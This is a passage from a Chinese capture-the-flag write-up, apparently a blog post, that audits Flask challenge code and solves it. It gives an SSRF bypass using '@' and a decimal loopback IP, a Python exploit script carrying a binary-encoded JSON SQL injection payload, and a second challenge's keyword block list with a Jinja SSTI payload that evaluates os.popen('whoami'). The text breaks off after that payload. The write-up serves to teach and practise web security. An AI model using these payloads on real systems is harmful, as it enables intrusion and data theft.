+</span></span><span class="line"><span class="ln">62</span><span class="cl">                <span class="n">flask</span><span class="o">.</span><span class="n">abort</span><span class="p">(</span><span class="mi">400</span><span class="p">,</span> <span class="s2">&#34;Too long&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">63</span><span class="cl">            <span class="k">if</span> <span class="s1">&#39;</span><span class="se">\&#39;</span><span class="s1">&#39;</span> <span class="ow">in</span> <span class="n">name</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">64</span><span class="cl">                <span class="n">flask</span><span class="o">.</span><span class="n">abort</span><span class="p">(</span><span class="mi">400</span><span class="p">,</span> <span class="s2">&#34;NO &#39;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">65</span><span class="cl">            <span class="k">if</span> <span class="s1">&#39;)&#39;</span> <span class="ow">in</span> <span class="n">name</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">66</span><span class="cl">                <span class="n">flask</span><span class="o">.</span><span class="n">abort</span><span class="p">(</span><span class="mi">400</span><span class="p">,</span> <span class="s2">&#34;NO )&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">67</span><span class="cl">            <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="ln">68</span><span class="cl"><span class="s2">            Some waf hidden here ;)
+</span></span></span><span class="line"><span class="ln">69</span><span class="cl"><span class="s2">            &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="ln">70</span><span class="cl">
+</span></span><span class="line"><span class="ln">71</span><span class="cl">            <span class="n">fate</span> <span class="o">=</span> <span class="n">db_search</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">72</span><span class="cl">            <span class="k">if</span> <span class="n">fate</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">73</span><span class="cl">                <span class="n">flask</span><span class="o">.</span><span class="n">abort</span><span class="p">(</span><span class="mi">404</span><span class="p">,</span> <span class="s2">&#34;No such Person&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">74</span><span class="cl">
+</span></span><span class="line"><span class="ln">75</span><span class="cl">            <span class="k">return</span> <span class="p">{</span><span class="s1">&#39;Fate&#39;</span><span class="p">:</span> <span class="n">fate</span><span class="p">}</span>
+</span></span><span class="line"><span class="ln">76</span><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">77</span><span class="cl">            <span class="n">flask</span><span class="o">.</span><span class="n">abort</span><span class="p">(</span><span class="mi">400</span><span class="p">,</span> <span class="s2">&#34;Hello local, and hello hacker&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">78</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">79</span><span class="cl">        <span class="n">flask</span><span class="o">.</span><span class="n">abort</span><span class="p">(</span><span class="mi">403</span><span class="p">,</span> <span class="s2">&#34;Only local access allowed&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">80</span><span class="cl">
+</span></span><span class="line"><span class="ln">81</span><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">82</span><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span></code></pre></div><p>审计一下源码，看到init_db里面的fake flag，思路大概就是要在/proxy路由ssrf访问/1337路由去sql读flag</p>
+<p>先看proxy，会将传入的url拼接到http://lamentxu.top后面</p>
+<p>这里可用@来绕过</p>
+<p>接着有两个判断，url中不能存在字母和.</p>
+<p>这里用长整型绕过即可</p>
+<pre tabindex="0"><code>/proxy?url=@2130706433:8080/1337
+</code></pre><p>接着我们看/1337</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">code</span> <span class="o">=</span> <span class="n">flask</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;0&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="k">if</span> <span class="n">code</span> <span class="o">==</span> <span class="s1">&#39;abcdefghi&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;0 win!&#39;</span><span class="p">)</span>
+</span></span></code></pre></div><p>第一个判断要求传入一串字母，直接传显然过不了/proxy处的判断</p>
+<p>我们这里可以二次编码绕过</p>
+<p>接着往下看</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="n">req</span> <span class="o">=</span> <span class="n">flask</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">            <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">                <span class="n">req</span> <span class="o">=</span> <span class="n">binary_to_string</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">                <span class="n">req</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">req</span><span class="p">)</span> <span class="c1"># No one can hack it, right? Pickle unserialize is not secure, but json is ;)</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">            <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">                <span class="n">flask</span><span class="o">.</span><span class="n">abort</span><span class="p">(</span><span class="mi">400</span><span class="p">,</span> <span class="s2">&#34;Invalid JSON&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">            <span class="k">if</span> <span class="s1">&#39;name&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">req</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">                <span class="n">flask</span><span class="o">.</span><span class="n">abort</span><span class="p">(</span><span class="mi">400</span><span class="p">,</span> <span class="s2">&#34;Empty Person&#39;s name&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">
+</span></span><span class="line"><span class="ln">11</span><span class="cl">            <span class="n">name</span> <span class="o">=</span> <span class="n">req</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">name</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">6</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">                <span class="n">flask</span><span class="o">.</span><span class="n">abort</span><span class="p">(</span><span class="mi">400</span><span class="p">,</span> <span class="s2">&#34;Too long&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">            <span class="k">if</span> <span class="s1">&#39;</span><span class="se">\&#39;</span><span class="s1">&#39;</span> <span class="ow">in</span> <span class="n">name</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">                <span class="n">flask</span><span class="o">.</span><span class="n">abort</span><span class="p">(</span><span class="mi">400</span><span class="p">,</span> <span class="s2">&#34;NO &#39;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">            <span class="k">if</span> <span class="s1">&#39;)&#39;</span> <span class="ow">in</span> <span class="n">name</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl">                <span class="n">flask</span><span class="o">.</span><span class="n">abort</span><span class="p">(</span><span class="mi">400</span><span class="p">,</span> <span class="s2">&#34;NO )&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">            <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="s2">            Some waf hidden here ;)
+</span></span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="s2">            &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl">
+</span></span><span class="line"><span class="ln">22</span><span class="cl">            <span class="n">fate</span> <span class="o">=</span> <span class="n">db_search</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="k">if</span> <span class="n">fate</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">24</span><span class="cl">                <span class="n">flask</span><span class="o">.</span><span class="n">abort</span><span class="p">(</span><span class="mi">404</span><span class="p">,</span> <span class="s2">&#34;No such Person&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">25</span><span class="cl">
+</span></span><span class="line"><span class="ln">26</span><span class="cl">            <span class="k">return</span> <span class="p">{</span><span class="s1">&#39;Fate&#39;</span><span class="p">:</span> <span class="n">fate</span><span class="p">}</span>
+</span></span></code></pre></div><p>这里会将传入的内容通过binary_to_string从二进制转换成字符串，接着会解析为json。接着有一连串waf。</p>
+<p>这里我们通过字典绕过，然后构造闭合读flag即可</p>
+<p>exp</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="c1">#字符串转二进制</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="k">def</span> <span class="nf">string_to_binary</span><span class="p">(</span><span class="n">input_string</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">    <span class="n">binary_chunks</span> <span class="o">=</span> <span class="p">[</span><span class="nb">bin</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">))[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">input_string</span><span class="p">]</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">binary_chunks</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;xxxxxxx&#34;</span><span class="o">+</span><span class="s2">&#34;/proxy?url=</span><span class="si">%40%</span><span class="s2">32</span><span class="si">%31%</span><span class="s2">33</span><span class="si">%30%</span><span class="s2">37</span><span class="si">%30%</span><span class="s2">36</span><span class="si">%34%</span><span class="s2">33</span><span class="si">%33%</span><span class="s2">3a</span><span class="si">%38%</span><span class="s2">30</span><span class="si">%38%</span><span class="s2">30</span><span class="si">%2f%31%</span><span class="s2">33</span><span class="si">%33%</span><span class="s2">37</span><span class="si">%3f%30%</span><span class="s2">3d</span><span class="si">%25%</span><span class="s2">36</span><span class="si">%31%</span><span class="s2">25</span><span class="si">%36%</span><span class="s2">32</span><span class="si">%25%</span><span class="s2">36</span><span class="si">%33%</span><span class="s2">25</span><span class="si">%36%</span><span class="s2">34</span><span class="si">%25%</span><span class="s2">36</span><span class="si">%35%</span><span class="s2">25</span><span class="si">%36%</span><span class="s2">36</span><span class="si">%25%</span><span class="s2">36</span><span class="si">%37%</span><span class="s2">25</span><span class="si">%36%</span><span class="s2">38</span><span class="si">%25%</span><span class="s2">36</span><span class="si">%39%</span><span class="s2">26</span><span class="si">%31%</span><span class="s2">3d&#34;</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">string_to_binary</span><span class="p">(</span><span class="s2">&#34;&#34;&#34;{&#34;name&#34;: {&#34;&#39;))))))) union select FATE from FATETABLE where NAME=&#39;LAMENTXU&#39;--&#34;:666}}&#34;&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="c1"># print(payload)</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;Fate&#39;</span><span class="p">])</span>
+</span></span></code></pre></div><p>‍</p>
+<p>‍</p>
+<h3 id="now-you-see-me-1"><strong>Now you see me 1</strong><a hidden class="anchor" aria-hidden="true" href="#now-you-see-me-1">#</a></h3>
+<p>从源代码中找出关键代码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="c1"># YOU FOUND ME :)</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="c1"># -*- encoding: utf-8 -*-</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="s1">@File    :   src.py
+</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="s1">@Time    :   2025/03/29 01:10:37
+</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="s1">@Author  :   LamentXU 
+</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="kn">import</span> <span class="nn">flask</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">
+</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="n">enable_hook</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="n">counter</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">
+</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">def</span> <span class="nf">audit_checker</span><span class="p">(</span><span class="n">event</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="k">global</span> <span class="n">counter</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">if</span> <span class="n">enable_hook</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">if</span> <span class="n">event</span> <span class="ow">in</span> <span class="p">[</span><span class="s2">&#34;exec&#34;</span><span class="p">,</span> <span class="s2">&#34;compile&#34;</span><span class="p">]:</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">            <span class="n">counter</span> <span class="o">+=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl">            <span class="k">if</span> <span class="n">counter</span> <span class="o">&gt;</span> <span class="mi">4</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl">                <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="n">event</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl">
+</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="n">lock_within</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="s2">&#34;debug&#34;</span><span class="p">,</span> <span class="s2">&#34;form&#34;</span><span class="p">,</span> <span class="s2">&#34;args&#34;</span><span class="p">,</span> <span class="s2">&#34;values&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="s2">&#34;headers&#34;</span><span class="p">,</span> <span class="s2">&#34;json&#34;</span><span class="p">,</span> <span class="s2">&#34;stream&#34;</span><span class="p">,</span> <span class="s2">&#34;environ&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="s2">&#34;files&#34;</span><span class="p">,</span> <span class="s2">&#34;method&#34;</span><span class="p">,</span> <span class="s2">&#34;cookies&#34;</span><span class="p">,</span> <span class="s2">&#34;application&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="s1">&#39;data&#39;</span><span class="p">,</span> <span class="s1">&#39;url&#39;</span> <span class="p">,</span><span class="s1">&#39;</span><span class="se">\&#39;</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="s2">&#34;getattr&#34;</span><span class="p">,</span> <span class="s2">&#34;_&#34;</span><span class="p">,</span> <span class="s2">&#34;{{&#34;</span><span class="p">,</span> <span class="s2">&#34;}}&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="s2">&#34;[&#34;</span><span class="p">,</span> <span class="s2">&#34;]&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;/&#34;</span><span class="p">,</span><span class="s2">&#34;self&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="s2">&#34;lipsum&#34;</span><span class="p">,</span> <span class="s2">&#34;cycler&#34;</span><span class="p">,</span> <span class="s2">&#34;joiner&#34;</span><span class="p">,</span> <span class="s2">&#34;namespace&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="ln">30</span><span class="cl">    <span class="s2">&#34;init&#34;</span><span class="p">,</span> <span class="s2">&#34;dir&#34;</span><span class="p">,</span> <span class="s2">&#34;join&#34;</span><span class="p">,</span> <span class="s2">&#34;decode&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="ln">31</span><span class="cl">    <span class="s2">&#34;batch&#34;</span><span class="p">,</span> <span class="s2">&#34;first&#34;</span><span class="p">,</span> <span class="s2">&#34;last&#34;</span> <span class="p">,</span> 
+</span></span><span class="line"><span class="ln">32</span><span class="cl">    <span class="s2">&#34; &#34;</span><span class="p">,</span><span class="s2">&#34;dict&#34;</span><span class="p">,</span><span class="s2">&#34;list&#34;</span><span class="p">,</span><span class="s2">&#34;g.&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">33</span><span class="cl">    <span class="s2">&#34;os&#34;</span><span class="p">,</span> <span class="s2">&#34;subprocess&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">34</span><span class="cl">    <span class="s2">&#34;g|a&#34;</span><span class="p">,</span> <span class="s2">&#34;GLOBALS&#34;</span><span class="p">,</span> <span class="s2">&#34;lower&#34;</span><span class="p">,</span> <span class="s2">&#34;upper&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">35</span><span class="cl">    <span class="s2">&#34;BUILTINS&#34;</span><span class="p">,</span> <span class="s2">&#34;select&#34;</span><span class="p">,</span> <span class="s2">&#34;WHOAMI&#34;</span><span class="p">,</span> <span class="s2">&#34;path&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">36</span><span class="cl">    <span class="s2">&#34;os&#34;</span><span class="p">,</span> <span class="s2">&#34;popen&#34;</span><span class="p">,</span> <span class="s2">&#34;cat&#34;</span><span class="p">,</span> <span class="s2">&#34;nl&#34;</span><span class="p">,</span> <span class="s2">&#34;app&#34;</span><span class="p">,</span> <span class="s2">&#34;setattr&#34;</span><span class="p">,</span> <span class="s2">&#34;translate&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">37</span><span class="cl">    <span class="s2">&#34;sort&#34;</span><span class="p">,</span> <span class="s2">&#34;base64&#34;</span><span class="p">,</span> <span class="s2">&#34;encode&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\\</span><span class="s2">u&#34;</span><span class="p">,</span> <span class="s2">&#34;pop&#34;</span><span class="p">,</span> <span class="s2">&#34;referer&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">38</span><span class="cl">    <span class="s2">&#34;The closer you see, the lesser you find.&#34;</span><span class="p">]</span> 
+</span></span><span class="line"><span class="ln">39</span><span class="cl">        
+</span></span><span class="line"><span class="ln">40</span><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">flask</span><span class="o">.</span><span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">41</span><span class="cl">
+</span></span><span class="line"><span class="ln">42</span><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">43</span><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+</span></span><span class="line"><span class="ln">44</span><span class="cl">    <span class="k">return</span> <span class="s1">&#39;try /H3dden_route&#39;</span>
+</span></span><span class="line"><span class="ln">45</span><span class="cl">
+</span></span><span class="line"><span class="ln">46</span><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/H3dden_route&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">47</span><span class="cl"><span class="k">def</span> <span class="nf">r3al_ins1de_th0ught</span><span class="p">():</span>
+</span></span><span class="line"><span class="ln">48</span><span class="cl">    <span class="k">global</span> <span class="n">enable_hook</span><span class="p">,</span> <span class="n">counter</span>
+</span></span><span class="line"><span class="ln">49</span><span class="cl">    <span class="n">name</span> <span class="o">=</span> <span class="n">flask</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;My_ins1de_w0r1d&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">50</span><span class="cl">    <span class="k">if</span> <span class="n">name</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">51</span><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">52</span><span class="cl">            <span class="k">if</span> <span class="n">name</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;Follow-your-heart-&#34;</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">53</span><span class="cl">                <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">lock_within</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">54</span><span class="cl">                    <span class="k">if</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">name</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">55</span><span class="cl">                        <span class="k">return</span> <span class="s1">&#39;NOPE.&#39;</span>
+</span></span><span class="line"><span class="ln">56</span><span class="cl">                <span class="n">enable_hook</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="ln">57</span><span class="cl">                <span class="n">a</span> <span class="o">=</span> <span class="n">flask</span><span class="o">.</span><span class="n">render_template_string</span><span class="p">(</span><span class="s1">&#39;{#</span><span class="si">{name}</span><span class="s1">#}&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">58</span><span class="cl">                <span class="n">enable_hook</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="ln">59</span><span class="cl">                <span class="n">counter</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="ln">60</span><span class="cl">                <span class="k">return</span> <span class="n">a</span>
+</span></span><span class="line"><span class="ln">61</span><span class="cl">            <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">62</span><span class="cl">                <span class="k">return</span> <span class="s1">&#39;My inside world is always hidden.&#39;</span>
+</span></span><span class="line"><span class="ln">63</span><span class="cl">        <span class="k">except</span> <span class="ne">RuntimeError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">64</span><span class="cl">            <span class="n">counter</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="ln">65</span><span class="cl">            <span class="k">return</span> <span class="s1">&#39;NO.&#39;</span>
+</span></span><span class="line"><span class="ln">66</span><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">67</span><span class="cl">            <span class="k">return</span> <span class="s1">&#39;Error&#39;</span>
+</span></span><span class="line"><span class="ln">68</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">69</span><span class="cl">        <span class="k">return</span> <span class="s1">&#39;Welcome to Hidden_route!&#39;</span>
+</span></span><span class="line"><span class="ln">70</span><span class="cl">
+</span></span><span class="line"><span class="ln">71</span><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">72</span><span class="cl">    <span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="ln">73</span><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">74</span><span class="cl">        <span class="kn">import</span> <span class="nn">_posixsubprocess</span>
+</span></span><span class="line"><span class="ln">75</span><span class="cl">        <span class="k">del</span> <span class="n">_posixsubprocess</span><span class="o">.</span><span class="n">fork_exec</span>
+</span></span><span class="line"><span class="ln">76</span><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">77</span><span class="cl">        <span class="k">pass</span>
+</span></span><span class="line"><span class="ln">78</span><span class="cl">    <span class="kn">import</span> <span class="nn">subprocess</span>
+</span></span><span class="line"><span class="ln">79</span><span class="cl">    <span class="k">del</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span>
+</span></span><span class="line"><span class="ln">80</span><span class="cl">    <span class="k">del</span> <span class="n">os</span><span class="o">.</span><span class="n">system</span>
+</span></span><span class="line"><span class="ln">81</span><span class="cl">    <span class="k">del</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span>
+</span></span><span class="line"><span class="ln">82</span><span class="cl">    <span class="k">del</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">call</span>
+</span></span><span class="line"><span class="ln">83</span><span class="cl">    <span class="k">del</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span>
+</span></span><span class="line"><span class="ln">84</span><span class="cl">    <span class="k">del</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span>
+</span></span><span class="line"><span class="ln">85</span><span class="cl">    <span class="k">del</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">getoutput</span>
+</span></span><span class="line"><span class="ln">86</span><span class="cl">    <span class="k">del</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">getstatusoutput</span>
+</span></span><span class="line"><span class="ln">87</span><span class="cl">    <span class="k">del</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span>
+</span></span><span class="line"><span class="ln">88</span><span class="cl">    <span class="k">del</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">STDOUT</span>
+</span></span><span class="line"><span class="ln">89</span><span class="cl">    <span class="k">del</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">CalledProcessError</span>
+</span></span><span class="line"><span class="ln">90</span><span class="cl">    <span class="k">del</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">TimeoutExpired</span>
+</span></span><span class="line"><span class="ln">91</span><span class="cl">    <span class="k">del</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">SubprocessError</span>
+</span></span><span class="line"><span class="ln">92</span><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">addaudithook</span><span class="p">(</span><span class="n">audit_checker</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">93</span><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">)</span>
+</span></span></code></pre></div><p>很明显的 SSTI，我们需要绕过一些过滤，看了一下发现 config 没有被过滤，所以我们可以用它来写入键值。</p>
+<p>通过content-type传参来进行绕过waf</p>
+<p>Payload：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="p">{{</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span><span class="s2">&#34;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&#34;</span><span class="p">)}}</span>
